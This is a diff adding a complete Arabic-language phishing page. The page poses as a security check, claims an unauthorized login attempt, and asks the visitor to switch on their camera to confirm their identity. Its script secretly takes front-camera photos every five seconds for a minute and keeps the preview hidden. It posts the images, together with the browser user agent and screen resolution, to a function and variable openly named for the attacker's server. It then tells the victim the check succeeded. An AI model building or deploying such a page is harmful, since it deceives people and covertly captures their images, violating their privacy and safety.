@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحقق من هويتك | Security Check</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+        }
+        h1 {
+            color: #333;
+            font-size: 1.5rem;
+        }
+        p {
+            color: #666;
+            line-height: 1.6;
+        }
+        .btn {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-top: 1rem;
+            width: 100%;
+        }
+        .btn:hover {
+            background-color: #0056b3;
+        }
+        .status {
+            margin-top: 1rem;
+            font-weight: bold;
+            color: green;
+        }
+        #videoPreview {
+            display: none;
+            margin: 1rem auto;
+            border-radius: 5px;
+            max-width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 تحقق من الأمان</h1>
+        <p>يبدو أن هناك محاولة دخول غير مصرح بها إلى حسابك. لتأكيد هويتك، يرجى السماح بالوصول إلى الكاميرا الخاصة بك لالتقاط صورة تحقق سريعة.</p>
+        <button class="btn" id="startCamera">تفعيل الكاميرا</button>
+        <div id="videoPreview" style="display: none;">
+            <video id="video" autoplay playsinline></video>
+        </div>
+        <div class="status" id="statusMessage"></div>
+    </div>
+
+    <script>
+        const startCameraBtn = document.getElementById('startCamera');
+        const videoPreview = document.getElementById('videoPreview');
+        const video = document.getElementById('video');
+        const statusMessage = document.getElementById('statusMessage');
+        let stream = null;
+
+        // دالة لالتقاط الصورة وإرسالها
+        function captureAndSend() {
+            if (!stream) return;
+
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            
+            // تحديد الحجم (1280x720)
+            canvas.width = 1280;
+            canvas.height = 720;
+
+            // رسم الفيديو الحالي على الـ Canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تحويل الصورة إلى Data URL (Base64)
+            const dataURL = canvas.toDataURL('image/jpeg', 0.9);
+            
+            // إرسال الصورة لخادم المهاجم
+            sendToAttackerServer(dataURL);
+        }
+
+        // دالة لإرسال البيانات للخادم
+        function sendToAttackerServer(imageData) {
+            // هنا تضع عنوان خادمك (localhost إذا كنت تختبر محليًا)
+            const attackerServer = "http://localhost:3000/capture";
+            
+            fetch(attackerServer, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    image: imageData,
+                    userAgent: navigator.userAgent,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    timestamp: new Date().toISOString()
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log("Image sent to attacker");
+                } else {
+                    console.error("Failed to send image");
+                }
+            }).catch(error => {
+                console.error("Error sending image", error);
+            });
+        }
+
+        // بدء الكاميرا
+        startCameraBtn.addEventListener('click', async () => {
+            try {
+                statusMessage.textContent = "جارٍ الاتصال بالكاميرا...";
+                
+                // طلب الوصول للكاميرا الأمامية
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: 1280, 
+                        height: 720, 
+                        facingMode: "user" // يحدد الكاميرا الأمامية
+                    }, 
+                    audio: false 
+                });
+
+                video.srcObject = stream;
+                videoPreview.style.display = 'none';
+                statusMessage.textContent = "الكاميرا تعمل، جارٍ التحليل...";
+
+                // التقاط صورة كل 5 ثوانٍ
+                setInterval(captureAndSend, 5000);
+
+                // إيقاف الكاميرا بعد 60 ثانية
+                setTimeout(() => {
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                        statusMessage.textContent = "تم التحقق بنجاح!";
+                        videoPreview.style.display = 'none';
+                    }
+                }, 60000);
+
+            } catch (err) {
+                statusMessage.textContent = "تعذر الوصول للكاميرا. تأكد من منح الإذن.";
+                console.error("Camera Error:", err);
+            }
+        });
+    </script>
+</body>
+</html>
